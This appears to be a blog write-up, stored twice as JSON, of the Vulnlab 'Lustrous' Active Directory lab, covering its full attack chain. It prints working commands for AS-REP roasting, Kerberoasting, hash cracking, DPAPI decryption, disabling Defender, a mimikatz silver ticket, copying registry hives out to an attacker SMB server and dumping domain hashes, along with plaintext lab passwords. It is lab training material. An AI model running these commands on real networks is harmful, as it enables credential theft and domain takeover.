'[...snip...]'\n76409e35c7b1e6cb267597498c3b9707b4884d3a\nca7dff911d9d033bfb16392388405b95a58e1896\nea6776f7e4fc1866d86e2858393ceee0c62020e0\n```\n\nWe'll now need to use one of these 3 pre-keys to develop the plaintext version of the `masterkey`. We can download the `masterkey` locally and use it as the file to run `pypykatz` against.\n\nI got lucky with the last pre-key, it seems that the other above it are invalid. It really all comes down to trial-and-error, run each pre-key against `pypykatz` to see which one of them works.\n\n```\n└─$ pypykatz dpapi masterkey ~/tech/vl/lustrous/dff9ecd4-2ab1-4eed-ab72-b909047c4e56 ea6776f7e4fc1866d86e2858393ceee0c62020e0 -o mkf\n```\n\nThis will save the `masterkey` into a JSON-formatted file that `pypykatz` can parse in our next command. If you don't run it with `-o (filename)`, you'll see that the decrypted `masterkey` will be printed out to the screen.\n\nLet's now use our decrypted `masterkey` to decrypt the secure string. I saved the secure string to a `txt` file which seemed to work for me.\n\n```\n└─$ pypykatz dpapi securestring mkf admin_1.txt\nError! non-hexadecimal number found in fromhex() arg at position 2\nHEX: 58005a00390069003d006200670[...snip...]e003900640052004600\nSTR: [...snip...]\n```\n\nYou'll see next to `STR` is the decrypted password for the Administrator user. Seems that we were able to decrypt it properly and can now use it to authenticate to the machine!\n\n![](/images/vulnlab/lustrous-vl/e.jpg)\n\nThe first flag is within `C:\\Users\\Administrator\\Desktop\\flag.txt`. I'll also run our Havoc binary again so we can load a beacon as this user.\n\n![](/images/vulnlab/lustrous-vl/f.jpg)\n\nOur next goal is to enumerate what we can do on this machine and see how we can get onto the DC.\n\n# Pivoting to the DC\n\nSo at this point, one of my pals and I were doing the chain for four to five hours and we had essentially tried everything out that we could possibly try - ADCS, LDAP Pivoting, cached credentials, password reusage, pretty much everything we could think of. I looked at the hint on the Wiki and it had told us to look at the hair of the person on the box image. I had interpreted it as white hair originally, but we when kept trying to understand what it was - we realized it had to be something with Kerberos.\n\nThat being said I want to give credit where credit is due since we did need a couple nudges for this. It definitely helped me learn to think a bit outside the box, so you can find the two writeups we nudged for this section below. The credit goes to them.\n\nhttps://thebinary0x1.medium.com/lustrous-vulnlab-walkthrough-f314f8b86134 - `nmht3t`\nhttps://vulndev.io/2021/12/27/lab-lustrous-walkthrough/ - `xct`\n\nSo if you had looked around the DC - you would've seen that port 80 was open. When accessing this, you would've immediately come into a regular IIS website that doesn't really tell you much. Brute forcing the directories doesn't help with much either - as there isn't anything out of the ordinary to compromise. However, if you had bound the DC's domain name, `LusDC.lustrous.vl` to the IP address of the DC, you'll come into contact with another page if you try to access it through HTTP.\n\n![](/images/vulnlab/lustrous-vl/g.jpg)\n\nRight now it's telling us that we do not have access to the website due to invalid credentials. But that's odd right - it didn't prompt us to enter in any credentials beforehand.\n\nThis is where a new type of authorization came into picture that I have never learned about before - Kerberos authentication to HTTP.\n\n# Kerberos Authentication to HTTP\n\nSo I've done alternate service delegation before with Cobalt Strike - and most of what I've done involved CIFS, LDAP, and MSSQL. What's interesting is that these are not the only services in AD that use Kerberos Authentication. There's a wide variety of services that can be used for Kerberos auth, and in our case we'll be looking at HTTP. You can find some resources for HTTP authentication through Kerberos [here](https://docs.axway.com/bundle/axway-open-docs/page/docs/apigtw_kerberos/kerberos_overview/index.html#:~:text=Kerberos%20authentication%20based%20on%20Simple,are%20transmitted%20in%20HTTP%20headers.) and [here](https://learn.microsoft.com/en-us/dotnet/framework/wcf/feature-details/understanding-http-authentication).\n\nEssentially, Kerberos authentication can be passed into HTTP headers based on the context of the current user that is trying to access it. Service tokens are issued in the context of the user and they are injected into headers before accessing the site. If the user has the correct header in relation to the service's cache, they'll be allowed access into the web service.\n\nFor our case, we can actually access this website through a logon session as `ben.cox`. You'll need to access RDP through the `LusMS` machine as the Administrator since `ben.cox` does not have RDP logon privileges.\n\nIf you try to access the website through Edge, you'll get redirected to an actual login panel.\n\n![](/images/vulnlab/lustrous-vl/h.jpg)\n\nWe won't be able to authenticate with our Administrator credentials since they're specific to our machine - but we can access with `ben.cox`'s credentials since they're a domain user.\n\nYou'll get redirected to a website called `Secure Notes`, which seems to be utilizing SSO to authenticate to our machine. This is what we had inferred originally, so it looks like we are correct.\n\nWithin the `Notes` tab, you'll find an interesting web page that seems to be a password reminder.\n\n![](/images/vulnlab/lustrous-vl/i.jpg)\n\nThe password for `ben.cox` seems to be relayed in plaintext. We can guess from here that any user that accesses this website using their credentials will have their password printed in plaintext in this specific tab. We also are reaffirmed of our Kerberos authentication theory in the `Task` row underneath the password.\n\nSo from here - we'll need compromise other users and get them to authenticate to this website in order to retrieve this password.\n\nIn order to do this - we'll need to use another account as `ben.cox` does not have any pertinent permissions/delegation over any of the other domain users. However, if you'll take a look back at Bloodhound, there are around 26 domain users that are within this domain. We had only tried to Kerberoast/ASREProast four of them at the beginning of this machine, so let's see if there are any other tickets we can retrieve with those user.\n\nI made a one-liner that creates a user list based on [LDAPDomainDump](https://github.com/dirkjanm/ldapdomaindump). This required dumping the domain once more, to which I also believe this is a built-in Kali tool. We'll use the `domain_users.json` file as the file to create a wordlist with, which should be generated automatically when we dump LDAP again.\n\n```\n└─$ cat domain_users.json | grep '@lustrous.vl' | awk '{print $1}' | cut -d '\"' -f 2 | cut -d '@' -f 1 > inc_list.txt\n```\n\nWe now have a user list to use, and we'll `GetUserSPNs` once more to test for Kerberoasting.\n\n```\n└─$ impacket-GetUserSPNs -dc-ip 10.10.169.5 -usersfile inc_list.txt -request lustrous.vl/'ben.cox':'Trinity1'\n......\n$krb5tgs$23$*svc_db$LUSTROUS.VL$svc_db*$4a204336b40ac1892e413b8f5da6[...snip...]\n$krb5tgs$23$*svc_web$LUSTROUS.VL$svc_web*$0e561f7154d282c3b6f0f00eb40d67f2$23e81c[...snip...]\n```\n\nAs you can see, we received two hits for `svc_db` and `svc_web`. We can crack both of these Kerberos tickets to attempt to receive a password for either of these users.\n\nWe'll use [hashcat](https://hashcat.net/wiki/doku.php?id=example_hashes) for this as it has an identifier to crack Kerberos 5 `e-type 23` TGS-REP tickets. The identifier that we'll need to use is `13100`.\n\nYou won't find any hits for `svc_db`, but you will for the `svc_web` user.\n\n```\n└─$ hashcat -a 0 -m 13100 wr_svc_web.txt /usr/share/wordlists/rockyou.txt\n......\n[...snip...]b3ba4bf7aba1a0dab346ec2bc2f1895636e7b32c585ece443cf97ab20fc8a767c4c42ad123540f1344e81ee2aea7649146acdae88c5ded877:[...snip...]\n```\n\nWe can guess based on the name of the account that this is the service account for the HTTP service - and given that now have access to that account, we can technically request a valid TGT to HTTP for any user on the domain.\n\n# Silver Ticket for `tony.ward`\n\nYou can request it for any user - though if you look back at Bloodhound you'll find interest in the `tony.ward` domain user. It seems that `tony.ward` is part of the `Backup Admins` group, which can hint at the fact that they might have `SeBackupPrivilege` enabled locally.\n\nSo let's try to request one as this user. We'll do this from our RDP session as Administrator due to the fact that it should launch a separate PowerShell window when we generate a new logon through Mimikatz.\n\nFirstly though, we'll need a few things to generate a Silver ticket for this user. I've compromised a list of what we'll need and where you can find it below.\n\n* Domain SID - We can find this in a few places, the easiest is in `AppData\\Roaming\\Microsoft\\Protect` in the Administrator's home directory. Make sure to remove the `500` identifier at the end of it since that relates to the Administrator user.\n* RC4 for SVC_WEB: We don't have access to this, but we can generate an RC4 ticket online [here](http://rc4.online-domain-tools.com/). We can use their password as both the input text and the key to generate the hash.\n* ID for `tony.ward`: You can find this in Bloodhound in the user's node underneath `Object ID`. Their ID should be `1114`.\n\nWith that we can build out the command for Mimikatz, which will upload through Havoc. Remember to disable AV so that `mimikatz` isn't blocked.\n\n```\n01/06/2024 20:57:23 [5pider] Demon » powershell Set-MpPreference -DisableRealtimeMonitoring $true\n\n01/06/2024 20:58:48 [5pider] Demon » upload (LOCAL PATH)/mimikatz.exe\n```\n\nWe'll then move back to the RDP session to execute `mimikatz` properly. This is due to some conflictions I ran into with Havoc, so we'll run it on the RDP session in the meanwhile.\n\n```\nPS C:\\Users\\Administrator\\Desktop> .\\mimikatz.exe \"kerberos::golden /domain:lustrous.vl /sid:S-1-5-21-2355092754-1584501958-1513963426 /target:lusdc.lustrous.vl /service:HTTP /rc4:e67af8b3d78df5a02eb0d57b6cb60717 /user:tony.ward /id:1114 /target:lusdc.lustrous.vl /ptt\" \"exit\"\n```\n\nThis should submit the Silver ticket for the current session that we are in. It will be say `Golden` ticket at the bottom but since we're requesting it from the context of a service account, it's a silver ticket.\n\nLet's now try to authenticate to the web service in our `tony.ward` login session.\n\n```\n(iwr http://lusdc.lustrous.vl/Internal -UseBasicParsing -UseDefaultCredentials).Content\n\n<td>\nPassword Reminder\n</td>\n<td>\n[...snip...]\n</td>\n<td>\nlustrous_tony.ward\n```\n\nAs you can see in the above output, we have successfully gained the credentials to `tony.ward` by abusing Kerberos HTTP authentication! We can now attempt to enumerate the DC as this user.\n\n# Exploiting SeBackupPrivilege Remotely\n\nYou'll notice relatively quickly that this user does not have RDP or WinRM access, though that isn't an overly large issue.\n\nWe made the assumption that we have `SeBackupPrivilege` enabled as this user due to the name of their `Backup Admins` group. Even though we can't access the machine and get a shell, we can still exploit this privilege remotely.\n\nTo do this, we'll use `impacket-reg` to access the registry remotely and pull the SAM, SYSTEM, and SECURITY databases from the DC. I've also stood up a simple SMB server through `impacket-smbserver` so we can download them to our machine.\n\n```\n└─$ impacket-smbserver smb share/ -smb2support\n\n└─$ impacket-reg lustrous.vl/'tony.ward':'U_cPVQqEI50i1X'@10.10.169.5 -dc-ip 10.10.169.5 backup -o \\\\\\\\(IP)\\\\smb\n```\n\nThis may take some time, as the SYSTEM database is a really large file. I've also ran into a few NETBIOS timeouts when running this, feel free to do a bit of trial and error with this tool. There also is an alternative with `BackupOperatorToDA`, which will perform a similar action.\n\nAnother note, I've had luck downloading the registry hives individually, you can do so with the below commands. Just make sure to wait a bit in between downloads so you don't receive an invalid handle error.\n\n```\n└─$ impacket-reg lustrous.vl/'tony.ward':'U_cPVQqEI50i1X'@10.10.251.85 save -keyName 'HKLM\\SAM' -o \\\\\\\\10.8.0.173\\\\smb_share\n\n└─$ impacket-reg lustrous.vl/'tony.ward':'U_cPVQqEI50i1X'@10.10.251.85 save -keyName 'HKLM\\SECURITY' -o \\\\\\\\10.8.0.173\\\\smb_share\n\n└─$ impacket-reg lustrous.vl/'tony.ward':'U_cPVQqEI50i1X'@10.10.251.85 save -keyName 'HKLM\\SECURITY' -o \\\\\\\\10.8.0.173\\\\smb_share\n```\n\nAfter it's finished, you should have all three files in the respective directory you used for the SMB server. We can now use these three files to dump the machine account NTLM hash for `LUSDC$`. (Make sure to close out of your SMB server so you don't receive a `read-length` error)\n\n```\n└─$ impacket-secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL\n\n[*] Target system bootKey: 0x9619c4c8e8d0c1e1314ca899f5573926\n[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)\n......\n$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:[...snip...]\n```\n\nThe NTLM hash for the `LUSDC$` has the username identifier `$MACHINE.ACC`. Although these names are different, this is the same user. Now that we have credentials to the machine account, we can use `impacket-secretsdump` once more to dump the Administrator user's NTLM hash.\n\n```\n└─$ impacket-secretsdump lustrous.vl/'LUSDC$'@lusdc.lustrous.vl -hashes aad3b435b51404eeaad3b435b51404ee:[...snip...] -just-dc-user Administrator\n\n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:[...snip...]:::\n```\n\nNow that we have the Administrator's NT hash, we can now use that to authenticate via WinRM to the DC!\n\n![](/images/vulnlab/lustrous-vl/j.jpg)\n\nWe can now access the Administrator's Desktop directory to view the root flag, in `C:\\Users\\Administrator\\Desktop\\root.txt`. This means we have successfully completed this chain!\n\n![](/images/vulnlab/lustrous-vl/k.jpg)\n\n# Conclusion\n\nI will say that despite needing to get a nudge from a few of the other writeups, I learned a lot from this chain. Like I said before, I didn't know you could create silver tickets to HTTP or really a lot of other services. I know for next time I do an AD box similar to this, I'll use this experience to check out a few other avenues. Big thanks to xct for the development of this machine - it helped me learn way more than I knew before.\n\n# Resources\n\nhttps://hashcat.net/wiki/doku.php?id=example_hashes\nhttps://github.com/BloodHoundAD/BloodHound\nhttps://github.com/HavocFramework/Havoc\nhttps://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords\nhttps://github.com/ParrotSec/mimikatz\nhttps://github.com/skelsec/pypykatz\nhttps://thebinary0x1.medium.com/lustrous-vulnlab-walkthrough-f314f8b86134\nhttps://vulndev.io/2021/12/27/lab-lustrous-walkthrough/\nhttps://docs.axway.com/bundle/axway-open-docs/page/docs/apigtw_kerberos/kerberos_overview/index.html#:~:text=Kerberos%20authentication%20based%20on%20Simple,are%20transmitted%20in%20HTTP%20headers.\nhttps://learn.microsoft.com/en-us/dotnet/framework/wcf/feature-details/understanding-http-authentication\nhttps://github.com/dirkjanm/ldapdomaindump\nhttp://rc4.online-domain-tools.com/\nhttps://www.thehacker.recipes/ad/movement/credentials/dumping/sam-and-lsa-secrets\n","source":"_posts/lustrous.md","raw":"---\ntitle: Lustrous - Vulnlab\ndate: 2024-06-05 16:45:32\ntags: [vulnlab, Medium, CHAIN]\ncategories: vulnlab\nkeywords: 'Vulnlab, Medium, Windows'\ndescription: This machine was really interesting to get into, as I learned how to practically implement backdoors onto a compromised host as well as GPO abuses and general vulnerability testing in domain accounts. Props to xct for creating this machine.\ncover: /images/vulnlab/lustrous-vl/lustrous_slide.png\ntop_img: /images/cyberpunk-red.jpg\ntoc: true\ntoc_number: false\n---\n\nThis machine is an Active Directory environment that starts from the domain controller and pivots to a workstation before returning back to the DC. Given that we have two machines that are both Windows, I'd like to use Havoc instead of Sliver as our C2 for this walkthrough.\n\n# Enumeration\n\nGiven the IP range of the instance it seems that there are only two machines to this chain. Let's start with our usual NMAP scans across them both.\n\n```\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-30 22:59 EDT\nNmap scan report for 10.10.226.53\nHost is up (0.12s latency).\nNot shown: 985 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n21/tcp   open  ftp\n53/tcp   open  domain\n80/tcp   open  http\n88/tcp   open  kerberos-sec\n135/tcp  open  msrpc\n139/tcp  open  netbios-ssn\n389/tcp  open  ldap\n443/tcp  open  https\n445/tcp  open  microsoft-ds\n464/tcp  open  kpasswd5\n593/tcp  open  http-rpc-epmap\n636/tcp  open  ldapssl\n3268/tcp open  globalcatLDAP\n3269/tcp open  globalcatLDAPssl\n3389/tcp open  ms-wbt-server\n\nNmap done: 1 IP address (1 host up) scanned in 18.60 seconds\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-30 23:00 EDT\n\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-30 23:00 EDT\nNmap scan report for 10.10.226.54\nHost is up (0.13s latency).\nNot shown: 996 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n135/tcp  open  msrpc\n139/tcp  open  netbios-ssn\n445/tcp  open  microsoft-ds\n3389/tcp open  ms-wbt-server\n\nNmap done: 1 IP address (1 host up) scanned in 23.69 seconds\n```\n\nI ran a few aggressive scans after this, it seems that both of these machines are Windows machines. The DC seems to be running on `.53` and a regular workstation is running on `.54`. The interesting part is that the entry point seems to be on `.53` as there are both HTTP and FTP ports enabled (with FTP having anonymous access).\n\nI'll also note down both of the DNS names for both machines below.\n\n```\nMachine 1 - LusDC.lustrous.vl\nMachine 2 - LusMS.lustrous.vl\n```\n\n# ASREP-roasting `ben.cox`\n\nAccessing the anonymous FTP instance gives us a file directory with 4 users, one of which being `ben.cox`. The file that they have in their home directory is `users.csv`, which seems to be a file that contains a few more users. I created a user list with mousepad, consisting of 5 users along with a few default users.\n\n```\nAdministrator\nGuest\nkrbtgt\nben.cox\nrachel.parker\ntony.ward\nwayne.taylor\nSQLServer2005SQLBrowserUser$LUSDC\n```\n\nGiven that we have a user list, we can run some basic Kerberos tests such as `GetNPUsers` and `GetUserSPNs` to see if any users are either kerberoastable or ASREProastable.\n\n```\n└─$ impacket-GetUserSPNs lustrous.vl/'Guest'@10.10.226.53 -dc-ip 10.10.226.53 -dc-host LusDC.lustrous.vl -usersfile ul.txt -request\n\n└─$ impacket-GetNPUsers lustrous.vl/'Guest'@10.10.226.53 -dc-ip 10.10.226.53 -dc-host LusDC.lustrous.vl -usersfile ul.txt -request\n\n$krb5asrep$23$ben.cox@LUSTROUS.VL:cb02cfec[...snip..]d749d0fc98c0c0731436c\n```\n\nIn our ASREP enumeration scan, you'll find that `ben.cox` has pre-auth enabled. \n\nWhen a user is trying to authenticate to a machine in the domain, they'll send an AS-REQ to the KDC to request for this login. If the request is valid and the authentication material is correct, the KDC will deliver an AS-REP in response to allow them to connect to their machine. If a user has `UF_DONT_REQUIRE_PREAUTH`, this means that they do not require any form of authentication or identification to request an AS-REP. The request has the users password hashed within it, meaning it is vulnerable to hash cracking.\n\nThis is the case for the `ben.cox` user, as `impacket-GetNPUsers` essentially used our user list to brute force all users to determine if they have `UF_DONT_REQUIRE_PREAUTH` set. Now that we have a valid AS-REP ticket, we can use `hashcat` to see if we can crack it. Make sure to copy the AS-REP ticket to a text file before using it with hashcat.\n\nOne more thing, you can find the specific hash cracking algorithm ID number to use on the example hashes website that `hashcat` provides [here](https://hashcat.net/wiki/doku.php?id=example_hashes). We're looking at ID 18200 for cracking KRB5 ASREP hashes for the request we have.\n\n```\n└─$ hashcat -a 0 -m 18200 bencox.txt /usr/share/wordlists/rockyou.txt\n\n[...snip...]65fe3adb19d749d0fc98c0c0731436c:[...snip...]\n```\n\nThe above command should crack it for you, and it should return a valid password for `ben.cox`. You can verify that this works by testing it against LDAP.\n\n```\n└─$ crackmapexec ldap 10.10.226.53 -u 'ben.cox' -p '[...snip...]'\nSMB         10.10.226.53    445    LUSDC            [*] Windows Server 2022 Build 20348 x64 (name:LUSDC) (domain:lustrous.vl) (signing:True) (SMBv1:False)\nLDAP        10.10.226.53    389    LUSDC            [+] lustrous.vl\\ben.cox:[...snip...]\n```\n\n# Dumping the Domain\n\nIf you attempt to use it for other services such as RDP, you'll notice that your creds won't be valid. That being said now that we have valid creds to LDAP, we can use them to dump all domain objects with [Bloodhound](https://github.com/BloodHoundAD/BloodHound).\n\n```\n└─$ bloodhound-python -d 'lustrous.vl' -u 'ben.cox' -p '[...snip...]' -c all -ns 10.10.226.53 --zip\n```\n\nThis should compress all of the domain objects into an archive which is compatible with Bloodhound. Omitting `--zip` will dump all of the objects based on categories (users, machines, etc.) which are still technically compatible, it's just much easier to do it through an archive.\n\nAfter starting Neo4j console and the GUI we'll upload our data and look around for any leads with our current user.\n\n![](/images/vulnlab/lustrous-vl/b.jpg)\n\nYou'll notice that our user `ben.cox` is within the `Remote Access` group, which I would assume is the equivalent of having `CanPSRemote` though I couldn't verify it off of Bloodhound.\n\n# Foothold as `ben.cox`\n\nI tested our access through WinRM, and it seems that we're able to access `LusMS` with our credentials.\n\n![](/images/vulnlab/lustrous-vl/c.jpg)\n\nNow that we have access through WinRM, let's look around the machine to see if there's anything we can download.\n\nFurthermore I also wanted to set up [Havoc C2](https://github.com/HavocFramework/Havoc) and plant a beacon onto this machine just so we can download and upload files easily. The reason as to why I'm using Havoc instead of Sliver is due to the fact that this first machine has AV enabled. Due to Havoc being a relatively new C2, the signatures for the binaries aren't detected in the current OS that these machines are running.\n\n![](/images/vulnlab/lustrous-vl/d.jpg)\n\nWe can now look around on the machine to determine if there's anything interesting for us to find. \n\n# DPAPI Secure String Decryption\n\nYou'll find an odd XML file on the machine within the `Desktop` directory of `ben.cox` after a bit of searching.\n\n```\n*Evil-WinRM* PS C:\\Users\\ben.cox\\Desktop> cat admin.xml\n<Objs Version=\"1.1.0.1\" xmlns=\"http://schemas.microsoft.com/powershell/2004/04\">\n<S N=\"UserName\">LUSMS\\Administrator</S>[...snip...]N=\"Password\">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000d4ecf9dfb12aed4eab72b909047c4e560000000002000000000003660000c000000010000000d5ad4244981a04676e2b522e24a5e8000000000004800000a00000001000000072cd97a471d9d6379c6d8563145c9c0e48000000f31b15696fdcdfdedc9d50e1f4b83dda7f36bde64dcfb8dfe8e6d4ec059cfc3cc87fa7d7898bf28cb02352514f31ed2fb44ec44b40ef196b143cfb28ac7eff5f85c131798cb77da914000000e43aa04d2437278439a9f7f4b812ad3776345367</SS>\n    </Props>\n  </Obj>\n</Objs>\n```\n\nAt first you'll think that this is a hash for the Administrator user, though it won't be detected by `JTR` or `Hashcat` properly. That's because it isn't - given that `System.Management.Automation.PSCredential` specifier. This tells us that it is a [DPAPI credential](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords) - though it's the secure string version of the credential instead of a credential blob.\n\nDPAPI is a Windows-specific symmetric encryption of asymmetric private keys, and is used as a way to properly cache data without leaving them in plaintext around the machine. This is another method to storing credentials - as the data is encrypted using a key that is derived from the user's logon secrets or credentials.\n\nI've worked with DPAPI credentials as a privilege escalation route before, and relatively straightforward. All that's required on our behalf is to find both the `masterkey` and the `prekey` in order to decrypt the secure string. The `masterkey` can be found within `C:\\Users\\ben.cox\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-2355092754-1584501958-1513963426-1117` and is denoted by the \n\n```\n*Evil-WinRM* PS C:\\Users\\ben.cox\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-2355092754-1584501958-1513963426-1117> Get-ChildItem . -Force\n\n\nDirectory: C:\\Users\\ben.cox\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-2355092754-1584501958-1513963426-1117\n\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\n-a-hs-        12/26/2021  10:28 AM            904 BK-LUSTROUS\n-a-hs-        12/26/2021  10:28 AM            740 dff9ecd4-2ab1-4eed-ab72-b909047c4e56\n-a-hs-        12/26/2021  10:28 AM             24 Preferred\n```\n\nNormally we'd just use [Mimikatz](https://github.com/ParrotSec/mimikatz) and use the `masterkey` to decrypt the credential, but not only do we not have debug privilege to do that - we also don't have the ability to run `mimikatz` due to our low-level privilege. (And also we aren't dealing with a blob, but instead a secure string)\n\nWe'll need to do this locally in order to decrypt the string efficiently. We can use a tool called [PyPyKatz](https://github.com/skelsec/pypykatz), which is a built-in tool on the latest version of Kali.\n\nFirst we'll need to develop a few pre-keys to retrieve a proper plaintext `masterkey` that's derived on the domain SID and our current user's credentials.\n\n```\n└─$ pypykatz dpapi prekey password 'S-1-5-21-2355092754-1584501958-1513963426-1117' '[...snip...]'\n76409e35c7b1e6cb267597498c3b9707b4884d3a\nca7dff911d9d033bfb16392388405b95a58e1896\nea6776f7e4fc1866d86e2858393ceee0c62020e0\n```\n\nWe'll now need to use one of these 3 pre-keys to develop the plaintext version of the `masterkey`. We can download the `masterkey` locally and use it as the file to run `pypykatz` against.\n\nI got lucky with the last pre-key, it seems that the other above it are invalid. It really all comes down to trial-and-error, run each pre-key against `pypykatz` to see which one of them works.\n\n```\n└─$ pypykatz dpapi masterkey ~/tech/vl/lustrous/dff9ecd4-2ab1-4eed-ab72-b909047c4e56 ea6776f7e4fc1866d86e2858393ceee0c62020e0 -o mkf\n```\n\nThis will save the `masterkey` into a JSON-formatted file that `pypykatz` can parse in our next command. If you don't run it with `-o (filename)`, you'll see that the decrypted `masterkey` will be printed out to the screen.\n\nLet's now use our decrypted `masterkey` to decrypt the secure string. I saved the secure string to a `txt` file which seemed to work for me.\n\n```\n└─$ pypykatz dpapi securestring mkf admin_1.txt\nError! non-hexadecimal number found in fromhex() arg at position 2\nHEX: 58005a00390069003d006200670[...snip...]e003900640052004600\nSTR: [...snip...]\n```\n\nYou'll see next to `STR` is the decrypted password for the Administrator user. Seems that we were able to decrypt it properly and can now use it to authenticate to the machine!\n\n![](/images/vulnlab/lustrous-vl/e.jpg)\n\nThe first flag is within `C:\\Users\\Administrator\\Desktop\\flag.txt`. I'll also run our Havoc binary again so we can load a beacon as this user.\n\n![](/images/vulnlab/lustrous-vl/f.jpg)\n\nOur next goal is to enumerate what we can do on this machine and see how we can get onto the DC.\n\n# Pivoting to the DC\n\nSo at this point, one of my pals and I were doing the chain for four to five hours and we had essentially tried everything out that we could possibly try - ADCS, LDAP Pivoting, cached credentials, password reusage, pretty much everything we could think of. I looked at the hint on the Wiki and it had told us to look at the hair of the person on the box image. I had interpreted it as white hair originally, but we when kept trying to understand what it was - we realized it had to be something with Kerberos.\n\nThat being said I want to give credit where credit is due since we did need a couple nudges for this. It definitely helped me learn to think a bit outside the box, so you can find the two writeups we nudged for this section below. The credit goes to them.\n\nhttps://thebinary0x1.medium.com/lustrous-vulnlab-walkthrough-f314f8b86134 - `nmht3t`\nhttps://vulndev.io/2021/12/27/lab-lustrous-walkthrough/ - `xct`\n\nSo if you had looked around the DC - you would've seen that port 80 was open. When accessing this, you would've immediately come into a regular IIS website that doesn't really tell you much. Brute forcing the directories doesn't help with much either - as there isn't anything out of the ordinary to compromise. However, if you had bound the DC's domain name, `LusDC.lustrous.vl` to the IP address of the DC, you'll come into contact with another page if you try to access it through HTTP.\n\n![](/images/vulnlab/lustrous-vl/g.jpg)\n\nRight now it's telling us that we do not have access to the website due to invalid credentials. But that's odd right - it didn't prompt us to enter in any credentials beforehand.\n\nThis is where a new type of authorization came into picture that I have never learned about before - Kerberos authentication to HTTP.\n\n# Kerberos Authentication to HTTP\n\nSo I've done alternate service delegation before with Cobalt Strike - and most of what I've done involved CIFS, LDAP, and MSSQL. What's interesting is that these are not the only services in AD that use Kerberos Authentication. There's a wide variety of services that can be used for Kerberos auth, and in our case we'll be looking at HTTP. You can find some resources for HTTP authentication through Kerberos [here](https://docs.axway.com/bundle/axway-open-docs/page/docs/apigtw_kerberos/kerberos_overview/index.html#:~:text=Kerberos%20authentication%20based%20on%20Simple,are%20transmitted%20in%20HTTP%20headers.) and [here](https://learn.microsoft.com/en-us/dotnet/framework/wcf/feature-details/understanding-http-authentication).\n\nEssentially, Kerberos authentication can be passed into HTTP headers based on the context of the current user that is trying to access it. Service tokens are issued in the context of the user and they are injected into headers before accessing the site. If the user has the correct header in relation to the service's cache, they'll be allowed access into the web service.\n\nFor our case, we can actually access this website through a logon session as `ben.cox`. You'll need to access RDP through the `LusMS` machine as the Administrator since `ben.cox` does not have RDP logon privileges.\n\nIf you try to access the website through Edge, you'll get redirected to an actual login panel.\n\n![](/images/vulnlab/lustrous-vl/h.jpg)\n\nWe won't be able to authenticate with our Administrator credentials since they're specific to our machine - but we can access with `ben.cox`'s credentials since they're a domain user.\n\nYou'll get redirected to a website called `Secure Notes`, which seems to be utilizing SSO to authenticate to our machine. This is what we had inferred originally, so it looks like we are correct.\n\nWithin the `Notes` tab, you'll find an interesting web page that seems to be a password reminder.\n\n![](/images/vulnlab/lustrous-vl/i.jpg)\n\nThe password for `ben.cox` seems to be relayed in plaintext. We can guess from here that any user that accesses this website using their credentials will have their password printed in plaintext in this specific tab. We also are reaffirmed of our Kerberos authentication theory in the `Task` row underneath the password.\n\nSo from here - we'll need compromise other users and get them to authenticate to this website in order to retrieve this password.\n\nIn order to do this - we'll need to use another account as `ben.cox` does not have any pertinent permissions/delegation over any of the other domain users. However, if you'll take a look back at Bloodhound, there are around 26 domain users that are within this domain. We had only tried to Kerberoast/ASREProast four of them at the beginning of this machine, so let's see if there are any other tickets we can retrieve with those user.\n\nI made a one-liner that creates a user list based on [LDAPDomainDump](https://github.com/dirkjanm/ldapdomaindump). This required dumping the domain once more, to which I also believe this is a built-in Kali tool. We'll use the `domain_users.json` file as the file to create a wordlist with, which should be generated automatically when we dump LDAP again.\n\n```\n└─$ cat domain_users.json | grep '@lustrous.vl' | awk '{print $1}' | cut -d '\"' -f 2 | cut -d '@' -f 1 > inc_list.txt\n```\n\nWe now have a user list to use, and we'll `GetUserSPNs` once more to test for Kerberoasting.\n\n```\n└─$ impacket-GetUserSPNs -dc-ip 10.10.169.5 -usersfile inc_list.txt -request lustrous.vl/'ben.cox':'Trinity1'\n......\n$krb5tgs$23$*svc_db$LUSTROUS.VL$svc_db*$4a204336b40ac1892e413b8f5da6[...snip...]\n$krb5tgs$23$*svc_web$LUSTROUS.VL$svc_web*$0e561f7154d282c3b6f0f00eb40d67f2$23e81c[...snip...]\n```\n\nAs you can see, we received two hits for `svc_db` and `svc_web`. We can crack both of these Kerberos tickets to attempt to receive a password for either of these users.\n\nWe'll use [hashcat](https://hashcat.net/wiki/doku.php?id=example_hashes) for this as it has an identifier to crack Kerberos 5 `e-type 23` TGS-REP tickets. The identifier that we'll need to use is `13100`.\n\nYou won't find any hits for `svc_db`, but you will for the `svc_web` user.\n\n```\n└─$ hashcat -a 0 -m 13100 wr_svc_web.txt /usr/share/wordlists/rockyou.txt\n......\n[...snip...]b3ba4bf7aba1a0dab346ec2bc2f1895636e7b32c585ece443cf97ab20fc8a767c4c42ad123540f1344e81ee2aea7649146acdae88c5ded877:[...snip...]\n```\n\nWe can guess based on the name of the account that this is the service account for the HTTP service - and given that now have access to that account, we can technically request a valid TGT to HTTP for any user on the domain.\n\n# Silver Ticket for `tony.ward`\n\nYou can request it for any user - though if you look back at Bloodhound you'll find interest in the `tony.ward` domain user. It seems that `tony.ward` is part of the `Backup Admins` group, which can hint at the fact that they might have `SeBackupPrivilege` enabled locally.\n\nSo let's try to request one as this user. We'll do this from our RDP session as Administrator due to the fact that it should launch a separate PowerShell window when we generate a new logon through Mimikatz.\n\nFirstly though, we'll need a few things to generate a Silver ticket for this user. I've compromised a list of what we'll need and where you can find it below.\n\n* Domain SID - We can find this in a few places, the easiest is in `AppData\\Roaming\\Microsoft\\Protect` in the 